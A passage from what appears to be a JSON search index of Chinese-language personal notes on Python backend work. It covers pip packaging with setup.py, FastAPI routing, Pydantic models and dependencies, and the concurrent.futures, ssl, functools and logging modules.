pyproject.toml ├── setup.py └── src ├── __init__.py └── win_clip_file.py 其他根目录下文件是相关配置, 其中setup.py是生成脚本, 一般内容如下, 根据实际修改: from setuptools import setup, find_packages setup(name='win_clipboard', version='0.0.1', description='to windows, copy file', # long_description='', # long_description_content_type=\"text/markdown\", # 模块详细介绍格式 # url=\"github地址\", # 模块github地址 author='yan que', author_email='yanquer@qq.com', requires=['win32clipboard', ], # 定义依赖哪些模块 # packages=find_packages(), # 系统自动从当前目录开始找包 # 如果有的文件不用打包，则只能指定需要打包的文件 packages=['win_clipboard', ], # 指定目录中需要打包的py文件，注意不要.py后缀 # 模块相关的元数据（更多的描述） # classifiers=[ # \"Programming Language :: Python :: 3\", # \"License :: OSI Approved :: MIT License\", # \"Operating System :: Independent\", # ], # 依赖模块 install_requires=[ \"pywin32\" ], # python版本 python_requires=\">=3\", license=\"apache 3.0\" ) setup参数说明: name 打包后包的文件名 version 版本号 author 作者 author_email 作者的邮箱 py_modules 要打包的.py文件 packages 打包的python文件夹 include_package_data 项目里会有一些非py文件,比如html和js等,这时候就要靠include_package_data 和 package_data 来指定了。 package_data:一般写成{‘your_package_name': [\"files\"]}, include_package_data还没完,还需要修改MANIFEST.in文件. MANIFEST.in文件的语法为: include xxx/xxx/xxx/.ini/(所有以.ini结尾的文件,也可以直接指定文件名) license 支持的开源协议 description 对项目简短的一个形容 ext_modules 是一个包含Extension实例的列表,Extension的定义也有一些参数。 ext_package 定义extension的相对路径 requires 定义依赖哪些模块 provides 定义可以为哪些模块提供依赖 data_files 指定其他的一些文件(如配置文件),规定了哪些文件被安装到哪些目录中。 如果目录名是相对路径,则是相对于sys.prefix或sys.exec_prefix的路径。如果没有提供模板,会被添加到MANIFEST文件中 打包: python setup.py bdist_wheel # 打包为whl文件 python setup.py sdist # 打包为tar.gz文件 会生成在当前目录下dist文件夹下面 若需要上传到pypi 需要先去注册账号 https://pypi.org/ 上传需要安装twine: pip install twine twine upload dist/* # 输入刚注册的用户名密码就能上传。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Homemade-PIP-package.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Homemade-PIP-package.html"},{"title":"基本路由","text":"参考: FastAPI 基本路由 可以先看前面的例子: /docs/后端/python/Web框架/FastAPI/简单使用 定义路由是装饰器: @app.get(\"/\")","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Basic-route.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Basic-route.html"},{"title":"结构详解","text":"源于: FastAPI FastAPI 站在以下巨人的肩膀之上： Starlette 负责 web 部分。 Pydantic 负责数据部分。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Detailed-structure.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Detailed-structure.html"},{"title":"FastAPI-Pydantic模型","text":"参考: FastAPI Pydantic 模型 Pydantic 是一个用于数据验证和序列化的 Python 模型库。 它在 FastAPI 中广泛使用，用于定义请求体、响应体和其他数据模型，提供了强大的类型检查和自动文档生成功能。 以下是关于 Pydantic 模型的详细介绍： 定义 Pydantic 模型 使用 Pydantic 定义一个模型非常简单，只需创建一个继承自 pydantic.BaseModel 的类， 并在其中定义字段。字段的类型可以是任何有效的 Python 类型，也可以是 Pydantic 内置的类型: from pydantic import BaseModel class Item(BaseModel): name: str description: str = None price: float tax: float = None 以上代码中中，我们定义了一个名为 Item 的 Pydantic 模型， 包含了四个字段：name、description、price 和 tax，name 和 price 是必需的字段， 而 description 和 tax 是可选的字段，其中 tax 的默认值为 None。 使用 Pydantic 模型 请求体验证 在 FastAPI 中，可以将 Pydantic 模型用作请求体（Request Body）， 以自动验证和解析客户端发送的数据: from fastapi import FastAPI from pydantic import BaseModel app = FastAPI() class Item(BaseModel): name: str description: str = None price: float tax: float = None @app.post(\"/items/\") def create_item(item: Item): return item 以上代码中中，create_item 路由处理函数接受一个名为 item 的参数， 其类型是 Item 模型。FastAPI 将自动验证传入的 JSON 数据是否符合模型的定义， 并将其转换为 Item 类型的实例。 查询参数验证 Pydantic 模型还可以用于验证查询参数、路径参数等: from fastapi import FastAPI, Query from pydantic import BaseModel app = FastAPI() class Item(BaseModel): name: str description: str = None price: float tax: float = None @app.get(\"/items/\") def read_item(item: Item, q: str = Query(..., max_length=10)): return {\"item\": item, \"q\": q} 以上代码中，read_item 路由处理函数接受一个 Item 模型的实例作为查询参数， 以及一个名为 q 的字符串查询参数。 通过使用 Query 函数，我们还可以为查询参数指定更多的验证规则，如最大长度限制。 自动文档生成 使用 Pydantic 模型的一个重要优势是，它能够自动为 FastAPI 生成交互式 API 文档。 文档会包括模型的字段、类型、验证规则等信息，让开发者和 API 使用者能够清晰地了解如何正确使用 API。 数据转换和序列化 Pydantic 模型不仅提供了验证功能，还可以用于将数据转换为特定类型（例如 JSON）或反向序列化。 在 FastAPI 中，这种能力是自动的，你无需手动处理。 通过使用 Pydantic 模型，你可以更轻松地定义和验证数据， 使得代码更清晰、更健壮，并通过自动生成的文档提供更好的 API 交互体验。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Fastapi-Pydantic-model.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Fastapi-Pydantic-model.html"},{"title":"表单数据","text":"在 FastAPI 中，接收表单数据是一种常见的操作，通常用于处理用户通过 HTML 表单提交的数据。 FastAPI 提供了 Form 类型，可以用于声明和验证表单数据。 声明表单数据模型 接下来我们设计一个接收一个登陆的表单数据，要使用表单，需预先安装 python-multipart: pip install python-multipart 代码如下: from fastapi import FastAPI, Form app = FastAPI() @app.post(\"/login/\") async def login(username: str = Form(), password: str = Form()): return {\"username\": username} 接下来我们可以进入 API 文档 http://127.0.0.1:8000/docs 进行测验 响应: 使用 Pydantic 模型来声明表单数据模型。 在模型中，使用 Field 类型声明每个表单字段，并添加必要的验证规则: from pydantic import BaseModel, Field class Item(BaseModel): name: str = Field(..., title=\"Item Name\", max_length=100) description: str = Field(None, title=\"Item Description\", max_length=255) price: float = Field(..., title=\"Item Price\", gt=0) 除了可以在 API 文档中测验，另外我们也可以自己创建 html 来测试: <form action=\"http://localhost:8000/items/\" method=\"post\"> <label for=\"name\">Name:</label> <input type=\"text\" id=\"name\" name=\"name\" required> <br> <label for=\"description\">Description:</label> <textarea id=\"description\" name=\"description\"></textarea> <br> <label for=\"price\">Price:</label> <input type=\"number\" id=\"price\" name=\"price\" required min=\"0\"> <br> <button type=\"submit\">Submit</button> </form> 在路由中接收表单数据 在路由操作函数中，可以使用 Form 类型来接收表单数据。 Form 类型的参数可以与 Pydantic 模型的字段一一对应，以实现表单数据的验证和转换: from fastapi import FastAPI, Form app = FastAPI() # 路由操作函数 @app.post(\"/items/\") async def create_item( name: str = Form(...), description: str = Form(None), price: float = Form(..., gt=0), ): return {\"name\": name, \"description\": description, \"price\": price} 以上例子中，create_item 路由操作函数接收了三个表单字段: name、description 和 price， 这些字段与 Item 模型的相应字段一致，FastAPI 将自动根据验证规则验证表单数据。 接下来我们可以进入 API 文档 http://127.0.0.1:8000/docs 进行测验： 响应: 表单数据的验证和文档生成 使用 Pydantic 模型和 Form 类型，表单数据的验证和文档生成都是自动的。 FastAPI 将根据模型中的字段信息生成交互式 API 文档，并根据验证规则进行数据验证。 API 文档地址 http://127.0.0.1:8000/docs 。 处理文件上传 如果表单包含文件上传，可以使用 UploadFile 类型处理。 以下是一个处理文件上传的实例: from fastapi import FastAPI, File, UploadFile app = FastAPI() # 路由操作函数 @app.post(\"/files/\") async def create_file(file: UploadFile = File(...)): return {\"filename\": file.filename} 在这个例子中，create_file 路由操作函数接收了一个 UploadFile 类型的文件参数。 FastAPI 将负责处理文件上传，并将文件的相关信息包装在 UploadFile 对象中， 可以轻松地获取文件名、内容类型等信息。 通过上述方式，FastAPI 提供了一种简单而强大的方法来接收和处理表单数据，同时保持了代码的清晰性和可维护性。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Form-data.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Form-data.html"},{"title":"安装配置","text":"FastAPI 依赖 Python 3.8 及更高版本。 安装 FastAPI 很简单，这里我们使用 pip 命令来安装: pip install fastapi 另外我们还需要一个 ASGI 服务器，生产环境可以使用 Uvicorn 或者 Hypercorn : pip install \"uvicorn[standard]\" 注解 两个合起来就是: pip install fastapi \"uvicorn[standard]\"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Installation.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Installation.html"},{"title":"交互式API文档","text":"参考: FastAPI 交互式 API 文档 FastAPI 提供了内置的交互式 API 文档，使开发者能够轻松了解和测试 API 的各个端点。 这个文档是自动生成的，基于 OpenAPI 规范， 支持 Swagger UI 和 ReDoc 两种交互式界面。 通过 FastAPI 的交互式 API 文档，开发者能够更轻松地理解和使用 API，提高开发效率 在运行 FastAPI 应用时，Uvicorn 同时启动了交互式 API 文档服务。 默认情况下，你可以通过访问: http://127.0.0.1:8000/docs 来打开 Swagger UI 风格的文档 或者访问: http://127.0.0.1:8000/redoc 来打开 ReDoc 风格的文档。 ReDoc 是另一种交互式文档界面，具有清晰简洁的外观。 它使得开发者能够以可读性强的方式查看 API 的描述、请求和响应。 与 Swagger UI 不同， ReDoc 的设计强调文档的可视化和用户体验。 注解 个人感觉 ReDoc 好看些, 不过 ReDoc 貌似不支持在文档调用API 交互式文档的优势 实时更新 交互式文档会实时更新，反映出应用代码的最新更改。 自动验证 输入参数的类型和格式会得到自动验证，降低了错误的可能性。 便于测试 可以直接在文档中进行 API 请求测试，避免使用其他工具。 升级实例 我们借助 Pydantic 来使用标准的 Python 类型声明请求体: from typing import Union from fastapi import FastAPI from pydantic import BaseModel app = FastAPI() class Item(BaseModel): name: str price: float is_offer: Union[bool, None] = None @app.get(\"/\") def read_root(): return {\"Hello\": \"World\"} @app.get(\"/items/{item_id}\") def read_item(item_id: int, q: Union[str, None] = None): return {\"item_id\": item_id, \"q\": q} @app.put(\"/items/{item_id}\") def update_item(item_id: int, item: Item): return {\"item_name\": item.name, \"item_id\": item_id}","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Interactive-API-document.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Interactive-API-document.html"},{"title":"路径操作依赖项","text":"参考: FastAPI 路径操作依赖项 FastAPI 提供了简单易用，但功能强大的依赖注入系统， 这个依赖系统设计的简单易用，可以让开发人员轻松地把组件集成至 FastAPI。 FastAPI 提供了路径操作依赖项（Path Operation Dependencies）的机制， 允许你在路由处理函数执行之前或之后运行一些额外的逻辑。 依赖项就是一个函数，且可以使用与路径操作函数相同的参数。 路径操作依赖项提供了一种灵活的方式来组织代码、验证输入、进行身份验证等。 接下来我们会具体介绍 FastAPI 路径操作依赖项的相关知识点。 依赖项（Dependencies） 依赖项是在路由操作函数执行前或后运行的可复用的函数或对象。 它们被用于执行一些通用的逻辑，如验证、身份验证、数据库连接等。 在 FastAPI 中，依赖项通常用于两个方面： 预处理（Before）依赖项： 在路由操作函数执行前运行，用于预处理输入数据，验证请求等。 后处理（After）依赖项： 在路由操作函数执行后运行，用于执行一些后处理逻辑，如日志记录、清理等。 依赖注入 依赖注入是 将依赖项注入到路由操作函数中的过程 在 FastAPI 中，通过 在路由操作函数参数中声明依赖项 来实现依赖注入。 FastAPI 将负责解析依赖项的参数，并确保在执行路由操作函数之前将其传递给函数。 依赖项的使用 定义依赖项: from fastapi import Depends, FastAPI app = FastAPI() # 依赖项函数 def common_parameters(q: str = None, skip: int = 0, limit: int = 100): return {\"q\": q, \"skip\": skip, \"limit\": limit} 在这个例子中，common_parameters 是一个依赖项函数，用于预处理查询参数。 在路由中使用依赖项: from fastapi import Depends # 路由操作函数 @app.get(\"/items/\") async def read_items(commons: dict = Depends(common_parameters)): return commons 在这个例子中，read_items 路由操作函数中的参数 commons 使用了 Depends(common_parameters)， 表示 common_parameters 是一个依赖项。 FastAPI 将在执行路由操作函数之前运行 common_parameters 函数，并将其返回的结果传递给 read_items 函数。 路径操作依赖项的基本使用 预处理（Before） 以下实例中，common_parameters 是一个依赖项函数， 它接受查询参数 q、skip 和 limit，并返回一个包含这些参数的字典。 在路由操作函数 read_items 中，通过传入 Depends(common_parameters)， 我们使用了这个依赖项函数，实现了在路由执行前预处理输入数据的功能: from fastapi import Depends, FastAPI, HTTPException app = FastAPI() # 依赖项函数 def common_parameters(q: str = None, skip: int = 0, limit: int = 100): return {\"q\": q, \"skip\": skip, \"limit\": limit} # 路由操作函数 @app.get(\"/items/\") async def read_items(commons: dict = Depends(common_parameters)): return commons 后处理（After） 以下例子中, after_request 是一个后处理函数，用于在路由执行后执行一些逻辑。 在路由操作函数 read_items_after 中，通过传入 Depends(after_request) ， 我们使用了这个后处理依赖项，实现了在路由执行后进行额外操作的功能: from fastapi import Depends, FastAPI, HTTPException app = FastAPI() # 依赖项函数 def common_parameters(q: str = None, skip: int = 0, limit: int = 100): return {\"q\": q, \"skip\": skip, \"limit\": limit} # 路由操作函数 @app.get(\"/items/\") async def read_items(commons: dict = Depends(common_parameters)): return commons # 后处理函数 async def after_request(): # 这里可以执行一些后处理逻辑，比如记录日志 pass # 后处理依赖项 @app.get(\"/items/\", response_model=dict) async def read_items_after(request: dict = Depends(after_request)): return {\"message\": \"Items returned successfully\"} 多个依赖项的组合 以下例子中，common_parameters 和 verify_token 是两个不同的依赖项函数， verify_token 依赖于 common_parameters，这种组合依赖项的方式允许我们在路由执行前先验证一些参数，然后在进行身份验证: from fastapi import Depends, FastAPI, HTTPException app = FastAPI() # 依赖项函数1 def common_parameters(q: str = None, skip: int = 0, limit: int = 100): return {\"q\": q, \"skip\": skip, \"limit\": limit} # 依赖项函数2 def verify_token(token: str = Depends(common_parameters)): if token is None: raise HTTPException(status_code=400, detail=\"Token required\") return token # 路由操作函数 @app.get(\"/items/\") async def read_items(token: dict = Depends(verify_token)): return token 异步依赖项 依赖项函数和后处理函数可以是异步的，允许在它们内部执行异步操作。 以下例子中，get_token 是一个异步的依赖项函数，模拟了一个异步操作。 在路由操作函数 read_items 中，我们使用了这个异步依赖项函数: from fastapi import Depends, FastAPI, HTTPException from typing import Optional import asyncio app = FastAPI() # 异步依赖项函数 async def get_token(): # 模拟异步操作 await asyncio.sleep(2) return \"fake-token\" # 异步路由操作函数 @app.get(\"/items/\") async def read_items(token: Optional[str] = Depends(get_token)): return {\"token\": token} 通过使用路径操作依赖项，你可以在路由执行前或后执行额外的逻辑，从而实现更灵活、可组合的代码组织方式。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Path-operation-dependencies.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Path-operation-dependencies.html"},{"title":"请求和响应","text":"参考: FastAPI 请求和响应 在 FastAPI 中，请求（Request）和响应（Response）是与客户端交互的核心。 FastAPI 提供了强大的工具来解析请求数据，并根据需要生成规范的响应。 接下来我们来详细看下 FastAPI 的请求和响应。 HTTP 相关内容可以参考: HTTP 请求方法 请求数据 查询参数 以下实例中我们定义了一个 /items/ 路由，接受两个查询参数 skip 和 limit，它们的类型均为整数，默认值分别为 0 和 10: from fastapi import FastAPI app = FastAPI() @app.get(\"/items/\") def read_item(skip: int = 0, limit: int = 10): return {\"skip\": skip, \"limit\": limit} 在命令行中运行以下命令以启动应用: uvicorn main:app --reload 现在，打开浏览器并访问 http://127.0.0.1:8000/items/ ，返回了默认的 JSON 数据: {\"skip\": 0, \"limit\": 10} 路径参数 我们可以把参数设置在路径上，这样 URL 看起来更美观一些。 以下实例我们定义了一个带有路径参数 item_id 和查询参数 q 的路由: from fastapi import FastAPI app = FastAPI() @app.get(\"/items/{item_id}\") def read_item(item_id: int, q: str = None): return {\"item_id\": item_id, \"q\": q} 传递 GET 请求的参数 http://127.0.0.1:8000/items/5/?q=runoob ， 返回 JSON 数据如下所示: {\"item_id\": 5, \"q\": \"runoob\"} 请求体 接下来我们创建了一个 /items/ 路由， 使用 @app.post 装饰器表示这是一个处理 POST 请求的路由: from pydantic import BaseModel from fastapi import FastAPI app = FastAPI() class Item(BaseModel): name: str description: str = None price: float tax: float = None @app.post(\"/items/\") def create_item(item: Item): return item 使用 Pydantic 模型 Item 定义了一个请求体，包含多个字段， 其中一些有默认值，更多 Pydantic 介绍参考: FastAPI Pydantic 模型 接下来我们可以打开 http://127.0.0.1:8000/docs 来进行 POST 测试： 填写请求参数： 返回结果: 响应数据 返回 JSON 数据 路由处理函数返回一个字典，该字典将被 FastAPI 自动转换为 JSON 格式，并作为响应发送给客户端: from fastapi import FastAPI app = FastAPI() @app.get(\"/items/\") def read_item(skip: int = 0, limit: int = 10): return {\"skip\": skip, \"limit\": limit} 以上代码在浏览器访问 http://127.0.0.1:8000/items/ ，返回了 JSON 数据: {\"skip\": 0, \"limit\": 10} 返回 Pydantic 模型 路由处理函数返回一个 Pydantic 模型实例，FastAPI 将 自动将其转换为 JSON 格式 ，并作为响应发送给客户端: from pydantic import BaseModel from fastapi import FastAPI app = FastAPI() class Item(BaseModel): name: str description: str = None price: float tax: float = None @app.post(\"/items/\") def create_item(item: Item): return item POST 请求，返回的数据格式如下所示: { \"name\": \"runoob\", \"description\": \"菜鸟教程 POST 测试\", \"price\": 12, \"tax\": 1 } 请求头和 Cookie 使用 Header 和 Cookie 类型注解获取请求头和 Cookie 数据: from fastapi import Header, Cookie from fastapi import FastAPI app = FastAPI() @app.get(\"/items/\") def read_item(user_agent: str = Header(None), session_token: str = Cookie(None)): return {\"User-Agent\": user_agent, \"Session-Token\": session_token} 以上代码在浏览器访问 http://127.0.0.1:8000/items/ ，返回了 JSON 数据: {\"User-Agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15\",\"Session-Token\":null} 重定向和状态码 使用 RedirectResponse 实现重定向，将客户端重定向到 /items/ 路由: from fastapi import Header, Cookie from fastapi import FastAPI from fastapi.responses import RedirectResponse app = FastAPI() @app.get(\"/items/\") def read_item(user_agent: str = Header(None), session_token: str = Cookie(None)): return {\"User-Agent\": user_agent, \"Session-Token\": session_token} @app.get(\"/redirect\") def redirect(): return RedirectResponse(url=\"/items/\") 使用 HTTPException 抛出异常，返回自定义的状态码和详细信息。 以下实例在 item_id 为 42 会返回 404 状态码: from fastapi import HTTPException @app.get(\"/items/{item_id}\") def read_item(item_id: int): if item_id == 42: raise HTTPException(status_code=404, detail=\"Item not found\") return {\"item_id\": item_id} 自定义响应头 使用 JSONResponse 自定义响应头: from fastapi import FastAPI from fastapi.responses import JSONResponse app = FastAPI() @app.get(\"/items/{item_id}\") def read_item(item_id: int): content = {\"item_id\": item_id} headers = {\"X-Custom-Header\": \"custom-header-value\"} return JSONResponse(content=content, headers=headers)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Request-and-response.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Request-and-response.html"},{"title":"简单使用","text":"参考: 第一个 FastAPI 应用 简单使用: # main.py from fastapi import FastAPI app = FastAPI() @app.get(\"/\") def read_root(): return {\"Hello\": \"World\"} 在命令行中运行以下命令以启动应用: uvicorn main:app --reload 注解 --reload 表示代码修改后自动重启服务器 打开浏览器并访问 http://127.0.0.1:8000 ， 你应该能够看到 FastAPI 自动生成的交互式文档，并在根路径 (\"/\") 返回的 JSON 响应: {\"Hello\": \"World\"} 接下来我们来丰富下代码功能，并做具体说明 以下的 FastAPI 应用，使用了两个路由操作（/ 和 /items/{item_id}）: from typing import Union from fastapi import FastAPI app = FastAPI() @app.get(\"/\") def read_root(): return {\"Hello\": \"World\"} @app.get(\"/items/{item_id}\") def read_item(item_id: int, q: Union[str, None] = None): return {\"item_id\": item_id, \"q\": q} 其中, 定义带路径参数和查询参数的路由操作: @app.get(\"/items/{item_id}\") def read_item(item_id: int, q: Union[str, None] = None): return {\"item_id\": item_id, \"q\": q} 函数接受两个参数: item_id --是路径参数，指定为整数类型。 q -- 是查询参数，指定为字符串类型或空（None）。 访问: http://127.0.0.1:8000/items/5?q=tttt9 你将会看到如下 JSON 响应: {\"item_id\":\"5\",\"q\":\"tttt9\"}","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Simply-use.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Simply-use.html"},{"title":"常见问题","text":"自定义请求头, 见 FastAPI-自定义请求头 重定向和状态码, 见 FastAPI-重定向和状态码 自定义响应头, 见 FastAPI-自定义响应头","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-common-problem.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-common-problem.html"},{"title":"concurrent","text":"官网: https://docs.python.org/zh-cn/3/library/concurrent.html 目前就一个包: concurrent.futures —— 启动并行任务 concurrent.futures 模块提供异步执行可调用对象高层接口。 异步执行可以由 ThreadPoolExecutor 使用线程或由 ProcessPoolExecutor 使用单独的进程来实现。 两者都是实现抽像类 Executor 定义的接口。 Executor class concurrent.futures.Executor 抽象类提供异步执行调用方法。要通过它的子类调用，而不是直接调用。 ThreadPoolExecutor concurrent.futures.ThreadPoolExecutor ThreadPoolExecutor 是 Executor 的子类，它使用线程池来异步执行调用。 当可调用对象已关联了一个 Future 然后在等待另一个 Future 的结果时就会导致死锁情况。例如: import time def wait_on_b(): time.sleep(5) print(b.result()) # b will never complete because it is waiting on a. return 5 def wait_on_a(): time.sleep(5) print(a.result()) # a will never complete because it is waiting on b. return 6 executor = ThreadPoolExecutor(max_workers=2) a = executor.submit(wait_on_b) b = executor.submit(wait_on_a) 与: def wait_on_future(): f = executor.submit(pow, 5, 2) # This will never complete because there is only one worker thread and # it is executing this function. print(f.result()) executor = ThreadPoolExecutor(max_workers=1) executor.submit(wait_on_future) ProcessPoolExecutor ProcessPoolExecutor 类是 Executor 的子类，它使用进程池来异步地执行调用。 ProcessPoolExecutor 会使用 /docs/后端/python/python标准库/multiprocessing 模块， 这允许它绕过 全局解释器锁 但也意味着只可以处理和返回可封存的对象。 __main__ 模块必须可以被工作者子进程导入。这意味着 ProcessPoolExecutor 不可以工作在交互式解释器中。 从可调用对象中调用 Executor 或 Future 的方法提交给 ProcessPoolExecutor 会导致死锁。 class concurrent.futures.ProcessPoolExecutor(max_workers=None, mp_context=None, initializer=None, initargs=(), max_tasks_per_child=None) 异步地执行调用的 Executor 子类使用最多具有 max_workers 个进程的进程池。 max_workers: 如果 max_workers 为 None 或未给出，它将默认为机器的处理器个数。 如果 max_workers 小于等于 0，则将引发 ValueError。 在 Windows 上，max_workers 必须小于等于 61，否则将引发 ValueError。 如果 max_workers 为 None，则所选择的默认值最多为 61，即使存在更多的处理器。 mp_context: 可以是一个多进程上下文或是 None。 它将被用来启动工作进程。 如果 mp_context 为 None 或未给出，则将使用默认的多进程上下文。 initializer: 一个可选的可调用对象，它会在每个工作进程启动时被调用； initargs: 传给 initializer 的参数元组。 如果 initializer 引发了异常，则所有当前在等待的任务以及任何向进程池提交更多任务的尝试都将引发 BrokenProcessPool。 max_tasks_per_child: = None 可选参数, 表示单个进程可执行的最大任务数. 超出将会使用新的进程(刷新). 默认 None 表示工作进程将会一直存活到进程池终止. 在默认情况,缺少MP_CONTEXT参数, 且指定了最大值时，将使用 spawn() 多进程启动方法. 与 fork() 启动方式不兼容. 在 3.3 版更改: 如果其中一个工作进程被突然终止，BrokenProcessPool 就会马上触发。 可预计的行为没有定义，但执行器上的操作或它的 future 对象会被冻结或死锁。 在 3.7 版更改: 添加 mp_context 参数允许用户控制由进程池创建给工作者进程的开始方法 。 加入 initializer 和*initargs* 参数。 在 3.11 版更改: The max_tasks_per_child argument was added to allow users to control the lifetime of workers in the pool. Future Future 类将可调用对象封装为异步执行。Future 实例由 Executor.submit() 创建。 class concurrent.futures.Future 将可调用对象封装为异步执行。Future 实例由 Executor.submit() 创建，除非测试，不应直接创建。 下面这些 Future 方法用于单元测试和 Executor 实现. 模块函数 wait as_completed Exception 类 CancelledError TimeoutError BrokenExecutor InvalidStateError BrokenThreadPool BrokenProcessPool","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Concurrent.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Concurrent.html"},{"title":"os","text":"官网: os --- 多种操作系统接口 属性 os.environ 一个 mapping 对象，其中键值是代表进程环境的字符串。 例如，environ['HOME'] 是你的主目录（在某些平台上）的路径名，相当于 C 中的 getenv(\"HOME\")。 函数","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-OS.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-OS.html"},{"title":"ssl","text":"官网: https://docs.python.org/zh-cn/3/library/ssl.html 套接字对象的TLS/SSL封装 该模块提供了对传输层安全（通常称为 \"安全套接字层\"）加密和网络套接字的对等认证设施的访问， 包括客户端和服务器端。 该模块使用 OpenSSL 库。 它可以在所有现代 Unix 系统、 Windows 、 macOS 和可能的其他平台上使用，只要 OpenSSL 安装在该平台上。 主要的一个API","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-SSL.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-SSL.html"},{"title":"functools","text":"官网 wraps partial 也叫偏函数 用途: 有些回调函数不支持传入参数, 可以使用此函数来支持参数. total_ordering 装饰器, 实现比较方法 注解 虽然此装饰器使得创建具有良好行为的完全有序类型变得非常容易， 但它 确实 是以执行速度更缓慢和派生比较方法的堆栈回溯更复杂为代价的。 如果性能基准测试表明这是特定应用的瓶颈所在，则改为实现全部六个富比较方法应该会轻松提升速度。 这个装饰器不会尝试重载类 或其上级类 中已经被声明的方法。 这意味着如果某个上级类定义了比较运算符，则 total_ordering 将不会再次实现它，即使原方法是抽象方法。 3.2 新版功能. 在 3.4 版更改: 现在已支持从未识别类型的下层比较函数返回 NotImplemented 异常。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-functools.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-functools.html"},{"title":"logging","text":"官网: https://docs.python.org/zh-cn/3/library/logging.html 知乎有篇总结的貌似也可以: https://zhuanlan.zhihu.com/p/425678081 算是内置的一个灵活的日志库 部分函数/模块使用说明 logging.basicConfig 最直接的使用是直接调用模块级别函数如: import logging logging.info('xxxx') 最简单的配置是使用 logging.basicConfig , 这会设置一个全局的日志配置, 如果多次调用, 以第一次的配置信息为准, 如设置日志: logging.basicConfig(filename='tmp_log.log', level=logging.DEBUG) 亦可设置日志格式: logging.basicConfig(format='%(asctime)s %(levelname)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p') logging.getLogger 获取日志处理器 可传入一个字符串参数, 表示处理器名, 多次调用且使用同一个字符串时, 返回同一个handler 若不传入参数, 表示获取 root logger logging.StreamHandler logging.StreamHandler() 获取一个stream的handler, 可添加给上面 getLogger 获取到的 logger, 表示输出到控制台. logging.FileHandler logging.Formatter 定义日志格式, 如: _formatter = \\ logging.Formatter('%(asctime)s - %{pathname}s[line:%{lineno}d] - %(levelname)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p') 设置好的 _formatter 可设置给handler(比如上面 FileHandler 的实例对象) 支持的格式字符串(部分): %(levelname)s: 日志级别(INFO、DEBUG、WARNING、ERROR等) %(filename)s: 发生日志记录的文件名称 %(funcName)s: 发生日志记录的函数名称 %(lineno)d: 发生日志记录的代码行数 %(asctime)s: 日志记录的时间,默认格式为%Y-%m-%d %H:%M:%S %(message)s: 日志记录的消息正文 %(name)s: Logger的名称 %(threadName)s: 线程名称 %(process)d: 进程ID %{pathname}s: 所执行程序所在路径, 绝对路径 %(filename)s : 所执行程序所在路径, 相对路径 logging.handlers logging.handlers模块提供了几种日志处理程序,用于处理日志记录。主要有以下几种: RotatingFileHandler:日志轮询处理,可以支持日志文件达到一定大小后自动切割为多个文件。 TimedRotatingFileHandler:日志定期轮询,可以按时间切割日志文件。 SMTPHandler:通过SMTP协议发送日志邮件。 HTTPHandler:将日志记录发送到HTTP服务器。 SocketHandler:将日志发送到网络套接字。 QueueHandler: 将日志记录发送到队列,由其他进程从队列中获取日志记录进行处理。 SysLogHandler:通过Syslog协议发送日志到syslog守护进程 RotatingFileHandler 如日志文件名为app.log, 最多10M, 保留最近5个日志文件: handler = RotatingFileHandler('app.log', maxBytes=10*1024*1024, backupCount=5) TimedRotatingFileHandler 通过TimedRotatingFileHandler每天做日志文件轮询,实现日志文件按日切割的功能: import logging from logging.handlers import TimedRotatingFileHandler logger = logging.getLogger(__name__) logger.setLevel(logging.INFO) # 每天做日志轮询 handler = TimedRotatingFileHandler('app.log', when='D', interval=1, backupCount=7) logger.addHandler(handler) logger.info('Start') SMTPHandler 通过SMTPHandler将日志发送邮件的方式进行处理: import logging from logging.handlers import SMTPHandler logger = logging.getLogger(__name__) logger.setLevel(logging.ERROR) # 通过SMTP发送日志邮件 mail_handler = SMTPHandler(mailhost='smtp.gmail.com', fromaddr='from@example.com', toaddrs=['to@example.com'], subject='Application Error', credentials=credentials) logger.addHandler(mail_handler) logger.error('Error occurred') 日志级别 日志等级: critical > error > warning > info > debug 级别越高打印的越少. debug : 打印 debug, info, warning, error, critical 级别的日志 info : 打印 info, warning, error, critical 级别的日志 warning : 打印 warning, error, critical 级别的日志 error : 打印 error, critical 级别的日志 critical : 打印 critical 级别 注解 默认只打印大于等于warning级别的日志 自定义配置(可选) logging标准模块支持三种配置方式: dictConfig dictConfig 是通过一个字典进行配置 